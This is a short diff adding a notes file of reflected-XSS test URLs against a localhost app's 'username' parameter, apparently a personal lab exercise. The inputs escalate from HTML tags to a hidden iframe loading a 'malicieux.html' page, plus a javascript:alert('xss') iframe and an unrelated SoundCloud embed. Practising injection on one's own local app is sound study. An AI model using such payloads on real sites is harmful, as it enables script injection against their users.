@@ -1,0 +1,11 @@
+http://localhost:3010/index.html?username=paul
+http://localhost:3010/index.html?username=%3Cp%3Epaul%3C/p%3E
+http://localhost:3010/index.html?username=%3Ca%20href=%22%22%3Ejean%3C/a%3E
+http://localhost:3010/index.html?username=%3Ciframe%20src=%22http://localhost:5500/malicieux.html%22%20style=%22display:none%22%3E
+http://localhost:3010/index.html
+
+<iframe src="javascript:alert(`xss`)">
+
+
+
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500"&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
